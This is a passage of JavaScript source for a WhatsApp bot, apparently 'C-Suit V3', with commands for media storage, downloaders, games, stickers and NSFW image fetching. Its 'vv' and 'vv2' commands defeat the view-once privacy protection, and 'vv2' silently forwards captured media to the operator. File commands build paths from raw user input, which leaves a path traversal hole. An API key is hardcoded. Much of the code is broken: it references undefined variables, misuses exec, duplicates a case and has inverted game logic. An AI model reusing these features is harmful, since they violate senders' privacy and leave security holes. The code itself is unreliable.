if (!args[0]) return replyCsuit(`Use ${prefix+command} nomor\nExample ${prefix+command} 923444844060`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(owner))
replyCsuit(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Video Name?')
                if (VideoXeon.includes(q)) return replyCsuit("The name you entered already exists")
                let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./C-SMedia/video/${q}.mp4`)
                fs.writeFileSync('./dtbs/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replyCsuit(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replyCsuit("Name Does Not Exist")
                let wxmenu_oh = VideoXeon.indexOf(q)
                VideoXeon.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./C-SMedia/video/${q}.mp4`)
                replyCsuit(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('The name of the image?')
                if (ImageCsuit.includes(q)) return replyCsuit("The name you entered is already registered in the database")
                let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
                ImageCsuit.push(q)
                await fsx.copy(delb, `./C-SMedia/image/${q}.jpg`)
                fs.writeFileSync('./dtbs/autoreply/image.json', JSON.stringify(ImageCsuit))
                fs.unlinkSync(delb)
                replyCsuit(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Enter the Image Name')
                if (!ImageCsuit.includes(q)) return replyCsuit("The image name you entered is not registered")
                let wxmenu_oh = ImageCsuit.indexOf(q)
                ImageCsuit.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/image.json', JSON.stringify(ImageCsuit))
                fs.unlinkSync(`./C-SMedia/image/${q}.jpg`)
                replyCsuit(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replyCsuit("Name Already In Use")
                let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./C-SMedia/sticker/${q}.webp`)
                fs.writeFileSync('./dtbs/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replyCsuit(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replyCsuit("Name Not Registered in Database")
                let wxmenu_oh = StickerXeon.indexOf(q)
                StickerLostBoyTechInc.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./C-SMedia/sticker/${q}.webp`)
                replyCsuit(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replyCsuit("Name Already In Use")
                let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./C-SMedia/audio/${q}.mp3`)
                fs.writeFileSync('./dtbs/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replyCsuit(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replyCsuit(mess.prem)
                if (args.length < 1) return replyCsuit('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replyCsuit("Name Not Registered in Database")
                let wxmenu_oh = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./C-SMedia/audio/${q}.mp3`)
                replyCsuit(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replyCsuit(mess.prem)
await loading()
if (args.length < 1) return replyCsuit(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replyCsuit("This name is already in use")
let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./C-SMedia/zip/${teks}.zip`)
fs.writeFileSync('./dtbs/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replyCsuit(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replyCsuit(mess.prem)
await loading()
if (args.length < 1) return replyCsuit('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replyCsuit("This name does not exist in the database")
let wxmenu_oh = ZipXeon.indexOf(teks)
ZipXeon.splice(wxmenu_oh, 1)
fs.writeFileSync('./dtbs/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./C-SMedia/zip/${teks}.zip`)
replyCsuit(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replyCsuit(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replyCsuit(mess.prem)
await loading()
if (args.length < 1) return replyCsuit('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replyCsuit("This name is already in use")
let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./C-SMedia/apk/${teks}.apk`)
fs.writeFileSync('./dtbs/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replyCsuit(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replyCsuit(mess.prem)
await loading()
if (args.length < 1) return replyCsuit('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replyCsuit("This name does not exist in the database")
let wxmenu_oh = ApkXeon.indexOf(teks)
ApkXeon.splice(wxmenu_oh, 1)
fs.writeFileSync('./dtbs/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./C-SMedia/apk/${teks}.apk`)
replyCsuit(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replyCsuit(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replyCsuit(mess.prem)
await loading()
if (args.length < 1) return replyCsuit('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replyCsuit("This name is already in use")
let delb = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./C-SMedia/doc/${teks}.pdf`)
fs.writeFileSync('./dtbs/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replyCsuit(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replyCsuit(mess.prem)
await loading()
if (args.length < 1) return replyCsuit('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replyCsuit("This name does not exist in the database")
let wxmenu_oh = DocApk.indexOf(teks)
docunye.splice(wxmenu_oh, 1)
fs.writeFileSync('./dtbs/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./C-SMedia/doc/${teks}.pdf`)
replyCsuit(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replyCsuit(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (isAfkOn) return replyCsuit("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyCsuit(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break


case 'video':
case 'ytmp4': {
    if (!text) return replyCsuit(`*Example*: ${prefix + command} band4band by central cee`);

    try {
        
        await LostBoyTechInc.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });


        const yts = require("yt-search");
        let search = await yts(text);
        let video = search.all[0]; 
        
        let body = `*CSUIT V3_VIDEO - PLAYER*\n` +
                   `> Title: *${video.title}*\n` +
                   `> Views: *${video.views}*\n` +
                   `> Duration: *${video.timestamp}*\n` +
                   `> Uploaded: *${video.ago}*\n` +
                   `> Url: *${video.url}*`;


        await LostBoyTechInc.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: body
        }, { quoted: m });


        const apiUrl = `https://api.davidcyriltech.my.id/download/ytmp4`;
        const apiResponse = await axios.get(apiUrl, {
            params: { url: video.url }
        });

        
        if (apiResponse.data.success) {
            const { title, download_url } = apiResponse.data.result;

            // Send the video file directly
            await LostBoyTechInc.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}\n\n> POWERED BY C SUIT`
            }, { quoted: m });
        } else {
            replyCsuit(`*Error fetching the video! Please try again later.*`);
        }
    } catch (error) {
        console.error('Error during video command:', error);
        replyCsuit(`*An error occurred while processing your request.*`);
    }
    break;
}
            case 'stickhighfive': {
                    axios.get(`https://api.waifu.pics/sfw/highfive`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickcuddle': {
                    axios.get(`https://api.waifu.pics/sfw/cuddle`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickcringe': {
                    axios.get(`https://api.waifu.pics/sfw/cringe`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickdance': {
                    axios.get(`https://api.waifu.pics/sfw/dance`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickhappy': {
                    axios.get(`https://api.waifu.pics/sfw/happy`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickglomp': {
                    axios.get(`https://api.waifu.pics/sfw/glomp`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'sticksmug': {
                    axios.get(`https://api.waifu.pics/sfw/smug`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickblush': {
                    axios.get(`https://api.waifu.pics/sfw/blush`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickawoo': {
                    axios.get(`https://api.waifu.pics/sfw/awoo`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
                case 'hot': {
    if (!isCreator) return replyCsuit(`Please choose one: heads or tails.\nExample: ${prefix}hot tails`);
    
    const userChoice = q.toLowerCase();
    const validChoices = ['head','tails'];
    if (!validChoices.includes(userChoice)) {
        return replyCsuit("Invalid choice. Please choose 'head', or 'tails'.");
    }

    // Bot's random choice
    const botChoice = validChoices[Math.floor(Math.random() * validChoices.length)];

    // Determine the winner
    let result;
    if (userChoice === botChoice) {
        result = "It's a draw!";
    } else if (
        (userChoice === 'head' && botChoice === 'tails') ||
        (userChoice === 'tails' && botChoice === 'tails') ||
        (userChoice === 'head' && botChoice === 'head') ||
        (userChoice === 'tails' && botChoice === 'head')
    ) {
        result = "You win! 🎉";
    } else {
        result = "You lose! 😢";
    }

    // Send the result
    replyCsuit(`🤖 *Head or tails*\n\nYou chose: *${userChoice}*\nI chose: *${botChoice}*\n\n*Result:* ${result}`);
    break;
}
case 'rps': {
    if (!isCreator) return replyCsuit(`Please choose one: rock, paper, or scissors.\nExample: ${prefix}rps rock`);
    
    const userChoice = q.toLowerCase();
    const validChoices = ['rock', 'paper', 'scissors'];
    if (!validChoices.includes(userChoice)) {
        return replyCsuit("Invalid choice. Please choose 'rock', 'paper', or 'scissors'.");
    }

    // Bot's random choice
    const botChoice = validChoices[Math.floor(Math.random() * validChoices.length)];

    // Determine the winner
    let result;
    if (userChoice === botChoice) {
        result = "It's a draw!";
    } else if (
        (userChoice === 'rock' && botChoice === 'scissors') ||
        (userChoice === 'paper' && botChoice === 'rock') ||
        (userChoice === 'scissors' && botChoice === 'paper')
    ) {
        result = "You win! 🎉";
    } else {
        result = "You lose! 😢";
    }

    // Send the result
    replyCsuit(`🤖 *Rock, Paper, Scissors*\n\nYou chose: *${userChoice}*\nI chose: *${botChoice}*\n\n*Result:* ${result}`);
    break;
}
            case 'stickwave': {
            await LostBoyTechInc.sendMessage(m.chat, { react: { text: '🍭', key: m.key } });
                    axios.get(`https://api.waifu.pics/sfw/wave`)
                    .then(({
                        data
                    }) => {
                        LostBoyTechInc.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
                case 'getlyrics': {
    if (!text) return m.reply(`Usage: ${prefix + command} <song title> by <artist name>`);

    // Extract the song title and artist name from the input
    const [title, artist] = text.split(' by ');

    if (!title || !artist) {
        return m.reply(`Please provide both the song title and the artist name. Usage: ${prefix + command} <song title> by <artist name>`);
    }

    const url = `https://api.davidcyriltech.my.id/lyrics2?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;

    try {
        // Fetch the lyrics from the API
        console.log(`Fetching lyrics for: ${title} by ${artist}`);
        const response = await axios.get(url);
        const lyrics = response.data.lyrics;

        // Split the lyrics into chunks of 4096 characters
        const chunks = lyrics.match(/.{1,4096}/g);

        // Send each chunk as a separate message
        for (const chunk of chunks) {
            await LostBoyTechInc.sendMessage(m.chat, { text: chunk }, { quoted: m });
        }
    } catch (error) {
        console.error('Error occurred:', error);
        m.reply('An error occurred: ' + error.message);
    }
}
break;
                case "totalcase":
              {
                //inireact();
                if (!isCreator) return replyCsuit(mess.owner);
                (penis = fs.readFileSync("./C-Suit-v3.js").toString()),
                  (matches =
                    penis.match(/case '[^']+'(?!.*case '[^']+')/g) || []),
                  (caseCount = matches.length),
                  (caseNames = matches.map(
                    (match) => match.match(/case '([^']+)'/)[1]
                  ));

                let totalCases = caseCount,
                  listCases = caseNames.join("\n• ");

                replyCsuit(
                  `Total case: ${totalCases}\n\n• ${
                    totalCases > 0 ? listCases : "No cases found."
                  }`
                );
              }
              break;
                case 'txt2img': {
    await LostBoyTechInc.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });

    if (!text) return m.reply(`Usage: ${prefix}txt2img <prompt>`);
    try {
        const apiUrl = `https://apitoxxictechinc.vercel.app/api/txt2img?prompt=${encodeURIComponent(text)}&apikey=toxxicboy`;
        const apiResponse = await axios.get(apiUrl);
        if (apiResponse.data.status !== 'success' || !apiResponse.data.result) {
            throw new Error('Failed to generate image from the API.');
        }

        const imageUrl = apiResponse.data.result;
        const imageMessage = {
            image: { url: imageUrl },
            caption: `C SUIT RESULTS ON ${text}`,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: imageUrl,
                    title: "Image Generation",
                    body: `Prompt: ${text}`,
                    sourceUrl: imageUrl,
                    thumbnail: await (await axios.get(imageUrl, { responseType: 'arraybuffer' })).data,
                },
            },
        };
        return LostBoyTechInc.sendMessage(m.chat, imageMessage, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply('An error occurred: ' + error.message);
    }
}
break;

case 'dev': case 'lostboy': {
await LostBoyTechInc.sendMessage(m.chat, { react: { text: `👑️`, key: m.key }})
replyCsuit(`═════════════════════╼
│    *「 𝐌𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧🎗️」*
│ *ᴺᵃᵐᵉ*   : *LOST BOY* 
│ *ᴬᵍᵉ*     : *𝐈𝐦 𝟏4 𝐲𝐞𝐚𝐫𝐬* 
│ *ᴴᵒᵇᵇʸ*   : *TECH* 
│ *ᴿᵒˡᵉ*       : *TOXXIC* 
│ *ᵂᵒʳᵈˢ*   : *TYPE SHII* 
│ *ˢᵗᵃᵗᵘˢ*    : *𝐀𝐥𝐢𝐯𝐞* 
│  ●LOSTBOY 
╰━━━━━━━━━━━━━━━━━━━━━━━━━╼`)
}
break




case 'readviewonce': case 'vv': {
	if (!m.quoted) return replyCsuit(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyCsuit(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return LostBoyTechInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return LostBoyTechInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case "totalcase":
              {
                //inireact();
                if (!isCreator) return replyCsuit(mess.owner);
                (penis = fs.readFileSync("./C-Suit-v3.js").toString()),
                  (matches =
                    penis.match(/case '[^']+'(?!.*case '[^']+')/g) || []),
                  (caseCount = matches.length),
                  (caseNames = matches.map(
                    (match) => match.match(/case '([^']+)'/)[1]
                  ));

                let totalCases = caseCount,
                  listCases = caseNames.join("\n• ");

                replyCsuit(
                  `Total case: ${totalCases}\n\n• ${
                    totalCases > 0 ? listCases : "No cases found."
                  }`
                );
              }
              break;
              case 'cecan-indo': {
await loading();
    try {
        // Log the start of the request
        console.log("Fetching data from the API...");

        // API call
        const apiUrl = 'https://api.agatz.xyz/api/indonesia';
        const response = await fetch(apiUrl);
        
        // Check if the response is ok (status code 200)
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Parse the JSON response
        const json = await response.json();

        // Log the API response to the console
        console.log("API Response:", json);

        // Extract the image URL from the response
        const imageUrl = json.data?.url; // Accessing URL from the response

        // Check if the image URL is present
        if (!imageUrl) {
            return replyCsuit("Failed to register img.");
        }

        // Prepare the caption with Italic font and indented quote
        const caption = "𝑯𝒆𝒓𝒆 𝒊𝒔 𝒂 𝑪𝒆𝒄𝒂𝒏 𝒇𝒓𝒐𝒎 𝑰𝒏𝒅𝒐𝒏𝒆𝒔𝒊𝒂 🇮🇩\n\n> C SUIT V3";

        // Send the image with the caption
        await LostBoyTechInc.sendMessage(from, {
            image: { url: imageUrl },
            caption: caption, // Caption added here
        }, { quoted: m });

    } catch (error) {
        console.error("Error in cecan-indo case:", error);
        // Optionally replyCsuit with an error message
        replyCsuit("Error occured.");
    }
    break;
}
case 'encode': {
    const textToEncode = m.quoted?.text || args.join(' '); 
    if (!textToEncode) 
        return replyCsuit(`\`Provide a message.\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} lostboy*`);

    try {
        await loading();

        const apiUrl = `https://api.popcat.xyz/encode?text=${encodeURIComponent(textToEncode)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        if (!json.binary) {
            return replyCsuit("Failed to encode.");
        }

        // Reply with clean binary text
        replyCsuit(`${json.binary}`);

    } catch (error) {
        console.error("Error in encode case:", error);
        replyCsuit(" *Error occured.");
    }
    break;
}
case 'decode': {
    let binaryToDecode = m.quoted?.text || args.join(' ');

    // Sanitize input (remove backticks, newlines, and extra spaces)
    binaryToDecode = binaryToDecode.replace(/[`*\n\r]/g, '').trim();

    if (!binaryToDecode) 
        return replyCsuit(`\`Please provide an encoded code to decode.\`\n*Example: ${prefix + command} 𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟙𝟙𝟘𝟘𝟟*`);

    try {
        await loading();

        // API call
        const apiUrl = `https://api.popcat.xyz/decode?binary=${encodeURIComponent(binaryToDecode)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        if (!json.text) {
            return replyCsuit("Failed to decode.");
        }

        replyCsuit(`*🔤 Decoded Text:*\n\n\`\`\`${json.text}\`\`\``);

    } catch (error) {
        console.error("Error in decode case:", error);
        replyCsuit("An error occured.");
    }
    break;
}
case 'vv2': {
	if (!m.quoted) return replyCsuit(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyCsuit(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return LostBoyTechInc.sendFile(LostBoyTechInc.user.id, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return LostBoyTechInc.sendFile(LostBoyTechInc.user.id, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case "remini": case "tohd": case "hd": {
if (/image/g.test(mime)) {
m.reply(msg.wait)
let tingkat
if (/remini/gi.test(command)) tingkat = 4
if (/tohd|hd/gi.test(command)) tingkat = 2
await LostBoyTechInc.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
let urlnya = await telegraPh(res)
let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
if (!image.status) return m.reply("Error!")
await LostBoyTechInc.sendMessage(m.chat, {image: {url: image.url}, caption: "Donel ✅"}, {quoted: m})
await fs.unlinkSync(res)
}).catch(err => m.reply(err.toString()))
} else return m.reply(example('Reply to an image'))
}
break
case 'ttt':
case 'ttc':
case 'tictactoe': {
if (!m.isGroup) return onlyGrup()
let TicTacToe = require("./lib/game/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply( 'You are still in the game!')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Opponent found !')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait  @${room.game.currentTurn.split('@')[0]}

Type .nyerah to surrender `
if (room.x !== room.o) await LostBoyTechInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
await LostBoyTechInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Waiting for opponent to play ' + (text ? ` type the command below  ${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break

case 'tiktokvideo':{
if (!isCreator) return replyCsuit('*Only Premium Members Are Allowed To Use This Command*')
if (!text) return replyCsuit( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyCsuit(`Link Invalid!!`)
await loading ()
require('./lib/tiktok').Tiktok(q).then( data => {
LostBoyTechInc.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
case 'tagadmin':
case 'listadmin': {
    if (!m.isGroup) return replyCsuit("This command can only be used in groups")
    const groupAdmins = participants.filter(p => p.admin);
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
    replyCsuit(`*Group Admins:*\n${listAdmin}`, { mentions: groupAdmins.map(v => v.id) });
}
break;
case 'trap':
   
    if (!isPremium) return onlyPremium();
    
    await loading();
    let trap = await axios.get(`https://waifu.pics/api/nsfw/${command}`);
    LostBoyTechInc.sendMessage(m.chat, { caption: '> C-SUIT-V3', image: { url: trap.data.url } }, { quoted: m });
    break;

case 'hneko':
    
    if (!isPremium) return onlyPremium();

    await loading();
    let hneko = await axios.get(`https://waifu.pics/api/nsfw/neko`);
    LostBoyTechInc.sendMessage(m.chat, { caption: '> C-SUIT-V3', image: { url: hneko.data.url } }, { quoted: m });
    break;

case 'nwaifu':
    
    if (!isPremium) return onlyPremium();
      await loading();
    let waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
    LostBoyTechInc.sendMessage(m.chat, { caption: '> C-SUIT-V3', image: { url: waifudd.data.url } }, { quoted: m });
    break;

case 'animespank':
    if (!isPremium) return onlyPremium();

    await loading();
    let waifud = await axios.get(`https://nekos.life/api/v2/img/spank`);
    LostBoyTechInc.sendMessage(m.chat, { caption: '> C-SUIT-V3', image: { url: waifud.data.url } }, { quoted: m }).catch(err => {
        return ('Error!');
    });
    break;

case 'gifblowjob':
    
    if (!isPremium) return onlyPremium();
    
    await loading();
    let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");
    var bobuff = await fetchBuffer(assss.data.url);
    var bogif = await buffergif(bobuff);
    LostBoyTechInc.sendMessage(m.chat, { video: bogif, gifPlayback: true }, { quoted: m }).catch(err => { });
    break;
      case 'listcase': {
    const listCase = () => {
        const code = fs.readFileSync("./C-Suit-V3.js", "utf8");
        var regex = /case\s+'([^']+)':/g;
        var matches = [];
        var match;
        while ((match = exec(code))) {
            matches.push(match[1]);
        }
        let teks = `*Total Case*: ${matches.length} \n\n`;
        matches.forEach(function (x) {
            teks += "☞ " + x + "\n"; // Added space after "☞"
        });
        teks += "\n> C-SUIT-V3";
        return teks;
    };
    replyCsuit(listCase());
}
break;
case 'ss':
 case 'ssweb': {
    if (!text) return replyCsuit(`*Example*: ${prefix + command} https://www.`);

    try {
        
        await LostBoyTechInc.sendMessage(m.chat, { react: { text: `📸`, key: m?.key } });

        // Fetch the screenshot from the API
        const apiUrl = `https://api.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}&device=tablet`;
        const apiResponse = await axios.get(apiUrl);

        
        if (apiResponse.data && apiResponse.data.success) {
            const { screenshotUrl } = apiResponse.data;

        
            await LostBoyTechInc.sendMessage(m.chat, {
                image: { url: screenshotUrl },
                caption: `🖼️ *Web Screenshot* \n\n🌐 URL: ${text}\n📱 Device: Tablet\n\n> C-SUIT-V3`
            }, { quoted: m });
        } else {
            replyCsuit(`*Failed to capture the screenshot! Please check the URL and try again.*`);
        }
    } catch (error) {
        
        console.error('Error during ssweb command:', error);
        replyCsuit(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
 case 'mediafire': {
    if (!text) return replyCsuit(`*Example*: ${prefix + command} https://www.mediafire.com/`);

    try {
        
        await LostBoyTechInc.sendMessage(m.chat, { react: { text: `📥`, key: m?.key } });


        const apiUrl = `https://api.davidcyriltech.my.id/mediafire?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

    
        if (apiResponse.data && apiResponse.data.downloadLink) {
            const { fileName, mimeType, downloadLink } = apiResponse.data;


            await LostBoyTechInc.sendMessage(m.chat, {
                document: { url: downloadLink },
                mimetype: mimeType,
                fileName: fileName,
                caption: `📦 *File Name:* ${fileName}\n\n> CSUIT V3`
            }, { quoted: m });
        } else {

            replyCsuit(`*Failed to fetch file details! Please check the MediaFire URL and try again.*`);
        }
    } catch (error) {

        console.error('Error during MediaFire command:', error);
        replyCsuit(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
case 'tourl': 
case 'url': {
    try {
        loading(); // Notify the user that the upload is starting

        // Download and save the media
        const media = await LostBoyTechInc.downloadAndSaveMediaMessage(qmsg);
        console.log("Media downloaded:", media);

        if (!media) throw new Error("Failed to download media");

        // Check if the file exists and its size
        const stats = await fs.promises.stat(media);
        if (stats.size === 0) {
            throw new Error("The downloaded media file is empty.");
        }

        let responseUrl;
        const mediaType = qmsg.mimetype; // Assuming qmsg has a mimetype property

        if (mediaType.startsWith('image/')) {
            // Upload image to catbox.moe
